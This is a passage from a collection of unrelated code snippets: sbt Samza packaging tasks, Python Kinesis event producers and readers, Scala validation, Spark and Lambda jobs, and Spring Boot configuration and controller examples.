        url(s"http://repo1.maven.org/maven2/org/apache/samza/samza-shell/0.9.1/${samzaShellFile.name}") #> samzaShellFile !

      samzaShellFile
    }
  }

  private object ExtractSamzaShellTask {
    val key = TaskKey[Unit]("extractSamzaShell", "Samza: extracts the samza-shell artifact", rank = KeyRanks.ATask)
    val setting = key := {
      val log = streams.value.log
      val packPath = pack.value
      val shellPath = GetSamzaShellTask.key.value
      val binPath = packPath / "bin"

      binPath.mkdir()

      log.info(s"Extracting ${shellPath} to ${binPath}")
      shellPath #> s"tar xz -C ${binPath}" ! log
    }
  }

  private object PackageTgzTask {
    val key = TaskKey[File]("packageJob", "Samza: produces a tarball artifact for our job", rank = KeyRanks.ATask)
    val setting = key := {
      RenderConfigTask.key.value
      ExtractSamzaShellTask.key.value
      val packPath = pack.value
      val output = (target in Compile).value / s"${name.value}-${version.value}-dist.tar.gz"

      s"tar zc -C ${packPath.getCanonicalPath} ./" #> output !

      output
    }
  }

  lazy val tasks = Seq(
    RenderConfigTask.setting,
    GetSamzaShellTask.setting,
    ExtractSamzaShellTask.setting,
    PackageTgzTask.setting
  )
}
--------------------------------------------------------------------------------------------------------
#!/usr/bin/env python

import os, datetime, socket, json, uuid, time
from boto import kinesis

def get_filesystem_metrics(path):
  stats = os.statvfs(path)
  block_size = stats.f_frsize
  return (block_size * stats.f_blocks, # Filesystem size in bytes
    block_size * stats.f_bfree,        # Free bytes
    block_size * stats.f_bavail)       # Free bytes excluding reserved space

def get_agent_version():
  return "0.1.0"

def get_hostname():
  return socket.gethostname()

def get_event_time():
  return datetime.datetime.now().isoformat()

def get_event_id():
  return str(uuid.uuid4())

def create_event():
  size, free, avail = get_filesystem_metrics("/")
  event_id = get_event_id()
  return (event_id, {
    "id": event_id,
    "subject": {
      "agent": {
        "version": get_agent_version()
      }
    },
    "verb": "read",
    "direct_object": {
      "filesystem_metrics": {
        "size": size,
        "free": free,
        "available": avail
      }
    },
    "at": get_event_time(),
    "on": {
      "server": {
        "hostname": get_hostname()
      }
    }
  })

def write_event(conn, stream_name):
  event_id, event_payload = create_event()
  event_json = json.dumps(event_payload)
  conn.put_record(stream_name, event_json, event_id)
  return event_id

if __name__ == '__main__':                                        # a
  conn = kinesis.connect_to_region(region_name="us-east-1",
    profile_name="ulp")
  while True:                                                     # b
    event_id = write_event(conn, "events")
    print "Wrote event: {}".format(event_id)
    time.sleep(10)                                                # c
--------------------------------------------------------------------------------------------------------
#!/usr/bin/env python

import json, time
from threading import Thread
from boto import kinesis
from boto.kinesis.exceptions import ProvisionedThroughputExceededException

class ShardReader(Thread):
  def __init__(self, name, stream_name, shard_id):
    super(ShardReader, self).__init__(None, name)
    self.name = name
    self.stream_name = stream_name
    self.shard_id = shard_id

  @staticmethod
  def detect_incident(event):
    decoded = json.loads(event)
    passed = None, None
    try:
      server = decoded['on']['server']['hostname']
      metrics = decoded['direct_object']['filesystem_metrics']
      pct_avail = metrics['available'] * 100 / metrics['size']
      return (server, pct_avail) if pct_avail <= 20 else passed
    except KeyError:
      return passed

  def run(self):
    try:
      next_iterator = conn.get_shard_iterator(self.stream_name,
        self.shard_id, 'TRIM_HORIZON')['ShardIterator']
      while True:
        response = conn.get_records(next_iterator, limit=10)
        for event in response['Records']:
          print '{} read event {}'.format(self.name,
            event['PartitionKey'])
          s, a = self.detect_incident(event['Data'])              # a
          if a:
            print '{} has only {}% disk available!'.format(s, a)  # b
        next_iterator = response['NextShardIterator']
        time.sleep(5)
    except ProvisionedThroughputExceededException as ptee:
       print 'Caught: {}'.format(ptee.message)
       time.sleep(5)

if __name__ == '__main__':
  conn = kinesis.connect_to_region(region_name="us-east-1",
    profile_name="ulp")
  stream = conn.describe_stream('events')
  shards = stream['StreamDescription']['Shards']

  threads = []                                                    # c
  for shard in shards:
    shard_id = shard['ShardId']
    reader_name = 'Reader-{}'.format(shard_id)
    reader = ShardReader(reader_name, 'events', shard_id)
    reader.start()
    threads.append(reader)                                        # c

  for thread in threads:                                          # d
    thread.join()
--------------------------------------------------------------------------------------------------------
package forex

import scalaz._
import Scalaz._

object AmountValidator {

  def validateAmount(raw: String): Validation[String, Double] = {  // a

    try {
      Success(raw.toDouble)                                        // b
    } catch {
      case nfe: NumberFormatException =>
        Failure("Amount must be parseable to Double, not " + raw)  // c
    }
  }
}


package forex

object Currency extends Enumeration {                              // a
  type Currency = Value
  val Usd = Value("USD")
  val Gbp = Value("GBP")
  val Eur = Value("EUR")
}

case class UnsupportedCurrencyException(raw: String)
  extends Exception("Currency must be USD/EUR/GBP, not " + raw)    // b

object CurrencyValidator1 {                                        // c

  @throws(classOf[UnsupportedCurrencyException])
  def validateCurrency(raw: String): Currency.Value = {

    val rawUpper = raw.toUpperCase(java.util.Locale.ENGLISH)
    try {
      Currency.withName(rawUpper)                                  // d
    } catch {
      case nsee: NoSuchElementException =>                         // e
        throw new UnsupportedCurrencyException(raw)
    }
  }
}


package forex

import scalaz._                                                    // a
import Scalaz._                                                    // a

object CurrencyValidator2 {

  def validateCurrency(raw: String):
    Validation[String, Currency.Value] = {                         // b

    val rawUpper = raw.toUpperCase(java.util.Locale.ENGLISH)
    try {
      Success(Currency.withName(rawUpper))                         // c
    } catch {
      case nsee: NoSuchElementException =>
        Failure("Currency must be USD/EUR/GBP, not " + raw)        // d
    }
  }
}


package forex

import scalaz._
import Scalaz._

case class OrderTotal(currency: Currency.Value, amount: Double)    // a

object OrderTotal {

  def parse(rawCurrency: String, rawAmount: String):
    Validation[NonEmptyList[String], OrderTotal] = {               // b

    val c = CurrencyValidator2.validateCurrency(rawCurrency)       // c
    val a = AmountValidator.validateAmount(rawAmount)              // d

    (c.toValidationNel |@| a.toValidationNel) {                    // e
      OrderTotal(_, _)
    }
  }
}

package nile

import org.apache.spark.{SparkContext, SparkConf}
import SparkContext._
import org.apache.spark.sql._
import functions._
import org.apache.hadoop.io.BytesWritable

object ShopperAnalysisJob {

  def main(args: Array[String]) {

    val (inFile, outFolder) = {                                    // a
      val a = args.toList
      (a(0), a(1))
    }

    val sparkConf = new SparkConf()
      .setAppName("ShopperAnalysis")
      .setJars(List(SparkContext.jarOfObject(this).get))           // b
    val sparkContext = new SparkContext(sparkConf)

    val file = sparkContext.sequenceFile[Long, BytesWritable](inFile)
    val jsons = file.map {
      case (_, bw) => toJson(bw)
    }

    val sqlContext = new SQLContext(sparkContext)
    val events = sqlContext.jsonRDD(jsons)

    val (shopper, item, order) =
      ("subject.shopper", "directObject.item", "directObject.order")
    val analysis = events
      .filter(s"${shopper} is not null")
      .groupBy(shopper)
      .agg(
        col(shopper),
        sum(s"${item}.quantity"),
        sum(col(s"${item}.quantity") * col(s"${item}.price")),
        count(order),
        sum(s"${order}.value")
      )

    analysis.rdd.saveAsTextFile(outFolder)                         // c
  }

  private def toJson(bytes: BytesWritable): String =               // d
    new String(bytes.getBytes, 0, bytes.getLength, "UTF-8")
}
--------------------------------------------------------------------------------------------------------
#!/usr/bin/env python

import random, datetime, json, copy, time, sys
from boto import kinesis

class Jsonable:
  def to_json(self):
    return json.dumps(self, default=lambda o: o.__dict__, 
        sort_keys=True, separators=(',',':'))

class Employee(Jsonable):
  def __init__(self, id, job_role):
    self.id = id
    self.jobRole = job_role

  def promote(self):
    if self.jobRole == "JNR_MECHANIC":
      self.jobRole = "SNR_MECHANIC"
    elif self.jobRole == "JNR_DRIVER":
      self.jobRole = "SNR_DRIVER"

class Vehicle(Jsonable):
  def __init__(self, vin, mileage):
    self.vin = vin
    self.mileage = mileage

  def step_miles(self, clock_direction):
    self.mileage += (clock_direction * random.randint(0,30))
    return self

class Location(Jsonable):
  def __init__(self, latitude, longitude, elevation):
    self.longitude = longitude
    self.latitude = latitude
    self.elevation = elevation

class Package(Jsonable):
  def __init__(self, id):
    self.id = id

class Customer(Jsonable):
  def __init__(self, id, is_vip):
    self.id = id
    self.isVip = is_vip

class Event(object, Jsonable):
  def __init__(self, event, timestamp):
    self.event = event
    self.timestamp = timestamp.isoformat() + "Z"

class TruckArrivesEvent(Event):
  def __init__(self, timestamp, vehicle, location):
    self.vehicle = copy.copy(vehicle)
    self.location = location
    super(TruckArrivesEvent, self).__init__("TRUCK_ARRIVES", timestamp)

class TruckDepartsEvent(Event):
  def __init__(self, timestamp, vehicle, location):
    self.vehicle = copy.copy(vehicle)
    self.location = location
    super(TruckDepartsEvent, self).__init__("TRUCK_DEPARTS", timestamp)

class MechanicChangesOil(Event):
  def __init__(self, timestamp, employee, vehicle):
    self.employee = copy.copy(employee)
    self.vehicle = copy.copy(vehicle)
    super(MechanicChangesOil, self).__init__("MECHANIC_CHANGES_OIL", timestamp)

class DriverDeliversPackage(Event):
  def __init__(self, timestamp, employee, package, customer, location):
    self.employee = copy.copy(employee)
    self.package = package
    self.customer = copy.copy(customer)
    self.location = location
    super(DriverDeliversPackage, self).__init__("DRIVER_DELIVERS_PACKAGE", timestamp)

class DriverMissesCustomer(Event):
  def __init__(self, timestamp, employee, package, customer, location):
    self.employee = employee
    self.package = package
    self.customer = customer
    self.location = location
    super(DriverMissesCustomer, self).__init__("DRIVER_MISSES_CUSTOMER", timestamp)

class Clock:
  def __init__(self, timestamp):
    self.timestamp = timestamp

  def step(self, clock_direction):
    self.timestamp += datetime.timedelta(0, 0, 0, 0, (clock_direction * random.randint(0,300)))
    return self.timestamp

MECHANICS = [
  Employee("f2caa6a0-2ce8-49d6-b793-b987f13cfad9", "SNR_MECHANIC"),
  Employee("f6381390-32be-44d5-9f9b-e05ba810c1b7", "JNR_MECHANIC")
]

DRIVERS = [
  Employee("3b99f162-6a36-49a4-ba2a-375e8a170928", "SNR_DRIVER"),
  Employee("54997a47-252d-499f-a54e-1522ac49fa48", "JNR_DRIVER"),
  Employee("c4b843f2-0ef6-4666-8f8d-91ac2e366571", "JNR_DRIVER")
]

TRUCKS = [
  Vehicle("1HGCM82633A004352", 32332),
  Vehicle("JH4TB2H26CC000000", 7839),
  Vehicle("19UYA31581L000000", 6754)
]

LOCATIONS = [
  Location(51.5228340, -0.0818130, 7),
  Location(51.5208046, -0.1592323, -25),
  Location(51.4972997, -0.0955459, 102),
  Location(51.4704679, -0.1176902, 15),
  Location(51.4865047, -0.0639602, 4)
]

CUSTOMERS = [
  Customer("b39a2b30-049b-436a-a45d-46d290df65d3", True),
  Customer("4594f1a1-a7a2-4718-bfca-6e51e73cc3e7", False),
  Customer("b1e5d874-963b-4992-a232-4679438261ab", False)
]

PACKAGES = [
  Package("c09e4ee4-52a7-4cdb-bfbf-6025b60a9144"),
  Package("ec99793d-94e7-455f-8787-1f8ebd76ef61"),
  Package("14a714cf-5a89-417e-9c00-f2dba0d1844d"),
  Package("834bc3e0-595f-4a6f-a827-5580f3d346f7"),
  Package("79fee326-aaeb-4cc6-aa4f-f2f98f443271")
]

clock = Clock(datetime.datetime(2015, 1, 1))

def write_event(conn, stream_name, clock_direction):
  global clock

  mechanic = random.choice(MECHANICS)
  driver = random.choice(DRIVERS)
  truck = random.choice(TRUCKS).step_miles(clock_direction)
  location = random.choice(LOCATIONS)
  customer = random.choice(CUSTOMERS)
  package = random.choice(PACKAGES)
  timestamp = clock.step(clock_direction)

  event = random.choice([
    TruckDepartsEvent(timestamp, truck, location),
    TruckArrivesEvent(timestamp, truck, location),
    MechanicChangesOil(timestamp, mechanic, truck),
    DriverMissesCustomer(timestamp, driver, package, customer, location),
    DriverDeliversPackage(timestamp, driver, package, customer, location)
    ])

  conn.put_record(stream_name, event.to_json(), str(random.random()))
  return (event.__class__.__name__, timestamp)

if __name__ == '__main__':
  conn = kinesis.connect_to_region(region_name="us-east-1",
    profile_name="ulp")

  if len(sys.argv) >= 2 and sys.argv[1] == "backwards":
    step_direction = -1
  else:
    step_direction = 1

  while True:
    event, ts = write_event(conn, "oops-events", step_direction)
    print "Wrote {} with timestamp {}".format(event, ts)
    time.sleep(1)
--------------------------------------------------------------------------------------------------------
package aowlambda

import java.util.UUID, org.joda.time.DateTime
import org.json4s._, org.json4s.jackson.JsonMethods._

case class EventSniffer(event: String)                              // a
case class Employee(id: UUID, jobRole: String)
case class Vehicle(vin: String, mileage: Int)
case class Location(latitude: Double, longitude: Double, elevation: Int)
case class Package(id: UUID)
case class Customer(id: UUID, isVip: Boolean)

sealed trait Event                                                  // b
case class TruckArrives(timestamp: DateTime, vehicle: Vehicle, 
  location: Location) extends Event
case class TruckDeparts(timestamp: DateTime, vehicle: Vehicle, 
  location: Location) extends Event
case class MechanicChangesOil(timestamp: DateTime, employee: Employee, 
  vehicle: Vehicle) extends Event
case class DriverDeliversPackage(timestamp: DateTime, employee: Employee,   
  `package`: Package, customer: Customer, location: Location) extends Event
case class DriverMissesCustomer(timestamp: DateTime, employee: Employee,   
  `package`: Package, customer: Customer, location: Location) extends Event

object Event {

  def fromBytes(byteArray: Array[Byte]): Event = {
    implicit val formats = DefaultFormats ++ ext.JodaTimeSerializers.all ++
      ext.JavaTypesSerializers.all
    val raw = parse(new String(byteArray, "UTF-8"))
    raw.extract[EventSniffer].event match {                        // c
      case "TRUCK_ARRIVES" => raw.extract[TruckArrives]
      case "TRUCK_DEPARTS" => raw.extract[TruckDeparts]
      case "MECHANIC_CHANGES_OIL" => raw.extract[MechanicChangesOil]
      case "DRIVER_DELIVERS_PACKAGE" => raw.extract[DriverDeliversPackage]
      case "DRIVER_MISSES_CUSTOMER" => raw.extract[DriverMissesCustomer]
      case e => throw new RuntimeException("Didn't expect " + e)   // d
    }
  }
}


package aowlambda

import com.amazonaws.services.lambda.runtime.events.KinesisEvent
import scala.collection.JavaConverters._

class LambdaFunction {

  def recordHandler(microBatch: KinesisEvent) {

    val allRows = for {                                            // a
      recs <- microBatch.getRecords.asScala.toList
      bytes = recs.getKinesis.getData.array 
      event = Event.fromBytes(bytes)
      row = Aggregator.map(event)
    } yield row

    val reducedRows = Aggregator.reduce(allRows)                   // b

    for (row <- reducedRows) {                                     // c
      Writer.conditionalWrite(row)
    }
  }
}


package aowlambda

import awscala._, dynamodbv2.{AttributeValue => AttrVal, _}
import com.amazonaws.services.dynamodbv2.model._
import scala.collection.JavaConverters._

object Writer {
  private val ddb = DynamoDB.at(Region.US_EAST_1)

  private def updateIf(key: AttributeValue, updExpr: String,
    condExpr: String, values: Map[String, AttributeValue],
    names: Map[String, String]) {                                  // a

    val updateRequest = new UpdateItemRequest()
      .withTableName("oops-trucks")
      .addKeyEntry("vin", key)
      .withUpdateExpression(updExpr)
      .withConditionExpression(condExpr)
      .withExpressionAttributeValues(values.asJava)
      .withExpressionAttributeNames(names.asJava)

    try {
      ddb.updateItem(updateRequest)
    } catch { case ccfe: ConditionalCheckFailedException => }      // b
  }

  def conditionalWrite(row: Row) {
    val vin = AttrVal.toJavaValue(row.vin)

    updateIf(vin, "SET #m = :m",
      "attribute_not_exists(#m) OR #m < :m",
      Map(":m" -> AttrVal.toJavaValue(row.mileage)),
      Map("#m" -> "mileage"))                                      // c

    for (maoc <- row.mileageAtOilChange) {                         // d
      updateIf(vin, "SET #maoc = :maoc",
        "attribute_not_exists(#maoc) OR #maoc < :maoc",
        Map(":maoc" -> AttrVal.toJavaValue(maoc)),
        Map("#maoc" -> "mileage-at-oil-change"))
    }

    for ((loc, ts) <- row.locationTs) {                            // e
      updateIf(vin, "SET #ts = :ts, #lat = :lat, #long = :long",
        "attribute_not_exists(#ts) OR #ts < :ts",
        Map(":ts"   -> AttrVal.toJavaValue(ts.toString),
            ":lat"  -> AttrVal.toJavaValue(loc.latitude),
            ":long" -> AttrVal.toJavaValue(loc.longitude)),
        Map("#ts"   -> "location-timestamp", "#lat" -> "latitude",
            "#long" -> "longitude"))
    }
  }
}


package aowlambda

import org.joda.time.DateTime, aowlambda.{TruckArrives => TA},
  aowlambda.{TruckDeparts => TD}, aowlambda.{MechanicChangesOil => MCO}

case class Row(vin: String, mileage: Int, mileageAtOilChange: Option[Int],
  locationTs: Option[(Location, DateTime)])                        // a

object Aggregator {

  def map(event: Event): Option[Row] = event match {               // b
    case TA(ts, v, loc) => Some(Row(v.vin, v.mileage, None, Some(loc, ts)))
    case TD(ts, v, loc) => Some(Row(v.vin, v.mileage, None, Some(loc, ts)))
    case MCO(ts, _, v)  => Some(Row(v.vin, v.mileage,Some(v.mileage),None))
    case _              => None
  }

  def reduce(events: List[Option[Row]]): List[Row] =               // c
    events
      .collect { case Some(r) => r }
      .groupBy(_.vin)
      .values
      .toList
      .map(_.reduceLeft(merge))

  private val merge: (Row, Row) => Row = (a, b) => {               // d

    val m = math.max(a.mileage, b.mileage)
    val maoc = (a.mileageAtOilChange, b.mileageAtOilChange) match {
      case (l @ Some(_), None) => l
      case (l @ Some(lMaoc), Some(rMaoc)) if lMaoc > rMaoc => l
      case (_, r) => r
    }
    val locTs = (a.locationTs, b.locationTs) match {
      case (l @ Some(_), None) => l
      case (l @ Some((_, lTs)), Some((_, rTs))) if lTs.isAfter(rTs) => l
      case (_, r) => r
    }
    Row(a.vin, m, maoc, locTs)
  }
}
--------------------------------------------------------------------------------------------------------
javac --release 8 com/baeldung/MajorMinorApp.java
javac -bootclasspath "C:\Apps\Java\jdk1.8.0_31\jre\lib\rt.jar" -source 1.8 -target 1.8 com/baeldung/MajorMinorApp.java
--------------------------------------------------------------------------------------------------------
java -Xmx32m -version
echo "MAVEN_OPTS='-Xmx2048m -XX:MaxPermSize=512m'" > ~/.mavenrc
sudo add-apt-repository -y ppa:linuxuprising/java
pip install --user codecov

--------------------------------------------------------------------------------------------------------
public class MainScreenProperties {
  @Min(1)
  private int refreshRate;
  @Min(50)
  @Max(1000)
  private int width;
  @Min(50)
  @Max(600)
  private int height;
    .............
}

    @Pattern(regexp = "\\d{3}-\\d{3}-\\d{4}")
    private String value;
    @Pattern(regexp = "(?i)cell|house|work")
    private String type;
--------------------------------------------------------------------------------------------------------
var bound = binder.bind("person.date-of-birth",
	Bindable.of(LocalDate.class));

// Return LocalDate or throws if not bound
bound.get();

// Return a formatted date or "No DOB"
bound.map(dateFormatter::format).orElse("No DOB");

// Return LocalDate or throws a custom exception
bound.orElseThrow(NoDateOfBirthException::new);
--------------------------------------------------------------------------------------------------------
@Component
@PropertySource("classpath:global.properties")
@ConfigurationProperties
public class GlobalProperties {

    private int threadPool;
    private String email;

    //getters and setters

}
--------------------------------------------------------------------------------------------------------
logging:
  level:
    org.springframework.web: ERROR
    com.mkyong: DEBUG
email: test@mkyong.com
thread-pool: 10
app:
  menus:
    - title: Home
      name: Home
      path: /
    - title: Login
      name: Login
      path: /login
  compiler:
    timeout: 5
    output-folder: /temp/
  error: /error/
--------------------------------------------------------------------------------------------------------
my.secret=${random.value}
my.number=${random.int}
my.bignumber=${random.long}
my.uuid=${random.uuid}
my.number.less.than.ten=${random.int(10)}
my.number.in.range=${random.int[1024,65536]}
--------------------------------------------------------------------------------------------------------
If you do not want command line properties to be added to the Environment, you can disable them by using SpringApplication.setAddCommandLineProperties(false).

app.name=MyApp
app.description=${app.name} is a Spring Boot application

environments:
	dev:
		url: https://dev.example.com
		name: Developer Setup
	prod:
		url: https://another.example.com
		name: My Cool App
		
server:
	address: 192.168.1.100
---
spring:
	profiles: development
server:
	address: 127.0.0.1
---
spring:
	profiles: production & eu-central
server:
	address: 192.168.1.120
	
acme:
  map:
    "[/key1]": value1
    "[/key2]": value2
    /key3: value3
	
acme:
  list:
    - name: my name
      description: my description
    - name: another name
      description: another description
---
spring:
  profiles: dev
acme:
  list:
    - name: my another name
	
acme:
  map:
    key1:
      name: my name 1
      description: my description 1
---
spring:
  profiles: dev
acme:
  map:
    key1:
      name: dev name 1
    key2:
      name: dev name 2
      description: dev description 2
--------------------------------------------------------------------------------------------------------
@ConfigurationProperties("app.system")
public class AppSystemProperties {

	@DurationUnit(ChronoUnit.SECONDS)
	private Duration sessionTimeout = Duration.ofSeconds(30);

	private Duration readTimeout = Duration.ofMillis(1000);

	public Duration getSessionTimeout() {
		return this.sessionTimeout;
	}

	public void setSessionTimeout(Duration sessionTimeout) {
		this.sessionTimeout = sessionTimeout;
	}

	public Duration getReadTimeout() {
		return this.readTimeout;
	}

	public void setReadTimeout(Duration readTimeout) {
		this.readTimeout = readTimeout;
	}
}

@ConfigurationProperties("app.io")
public class AppIoProperties {

	@DataSizeUnit(DataUnit.MEGABYTES)
	private DataSize bufferSize = DataSize.ofMegabytes(2);

	private DataSize sizeThreshold = DataSize.ofBytes(512);

	public DataSize getBufferSize() {
		return this.bufferSize;
	}

	public void setBufferSize(DataSize bufferSize) {
		this.bufferSize = bufferSize;
	}

	public DataSize getSizeThreshold() {
		return this.sizeThreshold;
	}

	public void setSizeThreshold(DataSize sizeThreshold) {
		this.sizeThreshold = sizeThreshold;
	}
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class) 
@WebMvcTest
@AutoConfigureMockMvc
public class UserControllerIntegrationTest {
 
    @MockBean
    private UserRepository userRepository;
     
    @Autowired
    UserController userController;
 
    @Autowired
    private MockMvc mockMvc;
 
    //...
     
}

@Test
public void whenPostRequestToUsersAndValidUser_thenCorrectResponse() throws Exception {
    MediaType textPlainUtf8 = new MediaType(MediaType.TEXT_PLAIN, Charset.forName("UTF-8"));
    String user = "{\"name\": \"bob\", \"email\" : \"bob@domain.com\"}";
    mockMvc.perform(MockMvcRequestBuilders.post("/users")
      .content(user)
      .contentType(MediaType.APPLICATION_JSON_UTF8))
      .andExpect(MockMvcResultMatchers.status().isOk())
      .andExpect(MockMvcResultMatchers.content()
        .contentType(textPlainUtf8));
}
 
@Test
public void whenPostRequestToUsersAndInValidUser_thenCorrectResponse() throws Exception {
    String user = "{\"name\": \"\", \"email\" : \"bob@domain.com\"}";
    mockMvc.perform(MockMvcRequestBuilders.post("/users")
      .content(user)
      .contentType(MediaType.APPLICATION_JSON_UTF8))
      .andExpect(MockMvcResultMatchers.status().isBadRequest())
      .andExpect(MockMvcResultMatchers.jsonPath("$.name", Is.is("Name is mandatory")))
      .andExpect(MockMvcResultMatchers.content()
        .contentType(MediaType.APPLICATION_JSON_UTF8));
    }
}
--------------------------------------------------------------------------------------------------------
    @RestController
    @RequestMapping("users")
    public class UserController {
        @Autowired
        UserService userService;
     
        @PostMapping
        public UserRest createUser(@RequestBody UserDetailsRequestModel requestUserDetails) {
            UserRest returnValue = new UserRest();
    // THROW EXCEPTION NOW JUST FOR DEMONSTRATION PURPOSES
                    
            if(true) throw new MissingRequiredFieldException("One of the required fields is missing");
    /////
            UserDto userDto = new UserDto();
            BeanUtils.copyProperties(requestUserDetails, userDto);
            UserDto createdUser = userService.createUser(userDto);
            BeanUtils.copyProperties(createdUser, returnValue);
            returnValue.setHref("/users/" + createdUser.getUserId());
            return returnValue;
        }
        @ResponseStatus(HttpStatus.BAD_REQUEST)
        @ExceptionHandler(MissingRequiredFieldException.class)
        public ErrorMessage handleBadRequest(HttpServletRequest req, Exception ex) {
           return new ErrorMessage(new Date(), ex.getMessage(), req.getRequestURI());
        }
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

import javax.validation.Valid;

@Controller
@RequestMapping
final class FormController {

    @GetMapping
    public String displayForm(Model model) {
        model.addAttribute("form", new Form());
        return "form";
    }

    @PostMapping
    public String processForm(@Valid Form form, BindingResult bindingResult, RedirectAttributes redirectAttributes) {
        if (bindingResult.hasErrors()) {
            return "form";
        }
        redirectAttributes.addFlashAttribute("form", form);
        return "redirect:/success";
    }

    @GetMapping("/success")
    public String successPage(Model model, @ModelAttribute("form") Form form) {
        model.addAttribute("form", form);
        return "success";
    }
}
--------------------------------------------------------------------------------------------------------
@Controller
public class CustomerController {

    @GetMapping("/customer")
    public String getCustomer(final Model model) {
        model.addAttribute("customer", new Customer());
        return "customer";
    }

    @PostMapping("/customer")
    public String createCustomer(@Valid Customer customer, BindingResult bindingResult,Model model){

        if(bindingResult.hasErrors()){
            return "customer";
        }
        model.addAttribute("msg", "Customer added");
        model.addAttribute("customer", customer);
        return "customer";
    }
}
--------------------------------------------------------------------------------------------------------
interface Condition {
    companion object {
        const val PREFIX = "touchstone.condition"
    }

    enum class Phase {
        PRE, POST
    }

    fun run(chunkContext: ChunkContext): ExitStatus

    fun phase(): Phase = Phase.PRE

    fun order(): Int = 1

    fun shouldRun(): Boolean = true

    val qualifiedName: String
        get() = listOf(PREFIX, phase().name, javaClass.simpleName)
                .joinToString(separator = ".") { it.toLowerCase(Locale.ENGLISH) }
}
--------------------------------------------------------------------------------------------------------
CREATE VIEW widened AS
  SELECT
    ev."event"              AS "event",
    ev."timestamp"          AS "timestamp",
    ev."customer.id"        AS "customer.id",
    ev."customer.is_vip"    AS "customer.is_vip",
    c."name"                AS "customer.name",
    c."zip_code"            AS "customer.zip_code",
    ev."employee.id"        AS "employee.id",
    ev."employee.job_role"  AS "employee.job_role",
    e."name"                AS "employee.name",
    e."dob"                 AS "employee.dob",
    ev."location.latitude"  AS "location.latitude",
    ev."location.longitude" AS "location.longitude",
    ev."location.elevation" AS "location.elevation",
    ev."package.id"         AS "package.id",
    p."weight"              AS "package.weight",
    ev."vehicle.vin"        AS "vehicle.vin",
    ev."vehicle.mileage"    AS "vehicle.mileage",
    v."make"                AS "vehicle.make",
    v."model"               AS "vehicle.model",
    v."year"                AS "vehicle.year"
  FROM events ev
    LEFT JOIN vehicles v  ON ev."vehicle.vin" = v.vin
    LEFT JOIN employees e ON ev."employee.id" = e.id
    LEFT JOIN packages p  ON ev."package.id"  = p.id
    LEFT JOIN customers c ON ev."customer.id" = c.id;
--------------------------------------------------------------------------------------------------------
  public static Boolean isAbandoned(Instant timestamp) {      // c
    Instant cutoff = Instant.now()
      .minusSeconds(ABANDONED_AFTER_SECS);
    return timestamp.isBefore(cutoff);
  }
--------------------------------------------------------------------------------------------------------
apply plugin: 'java'
apply plugin: 'application'

sourceCompatibility = '1.8'                           // a

mainClassName = 'nile.StreamApp'

repositories {
  mavenCentral()
}

version = '0.2.0'

dependencies {                                        // b
  compile 'org.apache.kafka:kafka-clients:0.9.0.0'
  compile 'com.maxmind.geoip:geoip-api:1.2.14'
  compile 'com.fasterxml.jackson.core:jackson-databind:2.6.3'
  compile 'org.slf4j:slf4j-api:1.7.5'
}

jar {                                                 // c
  manifest {
    attributes 'Main-Class': mainClassName
  }

  from {
    configurations.compile.collect {
      it.isDirectory() ? it : zipTree(it)
    }
  } {
    exclude "META-INF/*.SF"
    exclude "META-INF/*.DSA"
    exclude "META-INF/*.RSA"
  }
}
--------------------------------------------------------------------------------------------------------
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); #a

  ga('create', 'UA-34290195-2', 'test.com'); #b
  ga('send', 'pageview'); #c
  ga('send', 'event', 'video', 'play', 'doge-video-01');

</script>
--------------------------------------------------------------------------------------------------------
Vagrant.configure("2") do |config|

  config.vm.box = "ubuntu/trusty64"
  config.vm.hostname = "ulp"
  config.ssh.forward_agent = true

  # Forward guest ports for YARN
  config.vm.network "forwarded_port", guest: 8088, host: 8088
  config.vm.network "forwarded_port", guest: 8042, host: 8042

  config.vm.provider :virtualbox do |vb|
    vb.name = Dir.pwd().split("/")[-1] + "-" + Time.now.to_f.to_i.to_s
    vb.customize ["modifyvm", :id, "--natdnshostresolver1", "on"]
    vb.customize [ "guestproperty", "set", :id, "--timesync-threshold", 10000 ]
    # Scala is memory-hungry
    vb.memory = 3200
  end

  config.vm.provision :shell do |sh|
    sh.path = "vagrant/up.bash"
  end

end
--------------------------------------------------------------------------------------------------------
@Async
public Future<?> consumeSegmentEvents() {
    final ParameterizedTypeReference<ServerSentEvent<String>> type = new ParameterizedTypeReference<>() {
    };
    final Flux<ServerSentEvent<String>> eventStream = this.client.get()
        .uri("/api/pem/segments/stream")
        .accept(MediaType.TEXT_EVENT_STREAM)
        .retrieve()
        .bodyToFlux(type);
    return new AsyncResult<Flux<?>>(eventStream);
    //eventStream.subscribe(content -> log.info("Current time: {} - Received SSE: name[{}], id [{}], content[{}] ", LocalTime.now(), content.event(), content.id(), content.data()), error -> log.error("Error receiving SSE: {}", error), () -> log.info("Completed!!!"));
}
--------------------------------------------------------------------------------------------------------
    @Override
    public PageWrapper<E> getAll(int page, int size) {
        final ParameterizedTypeReference<List<E>> responseType = new ParameterizedTypeReference<>() {};
        final UriComponentsBuilder builder = UriComponentsBuilder.fromHttpUrl(QUICK_POLL_URI_2).queryParam("page", page).queryParam("size", size);
        final ResponseEntity responseEntity = restTemplate.exchange(builder.build().toUri(), HttpMethod.GET, null, responseType);
        final PageWrapper<E> allPolls = responseEntity.getBody();
        return allPolls;
    }

    @Override
    public List<E> getAll() {
        final ParameterizedTypeReference<List<E>> responseType = new ParameterizedTypeReference<>() {};
        final ResponseEntity<List<E>> responseEntity = restTemplate.exchange(QUICK_POLL_URI_V1, HttpMethod.GET, null, responseType);
        return responseEntity.getBody();
    }
--------------------------------------------------------------------------------------------------------
Map<String, Integer> map = Stream.of(new Object[][] { 
    { "data1", 1 }, 
    { "data2", 2 }, 
}).collect(Collectors.toMap(data -> (String) data[0], data -> (Integer) data[1]));

Map<String, String> map = Stream.of(new String[][] {
  { "Hello", "World" }, 
  { "John", "Doe" }, 
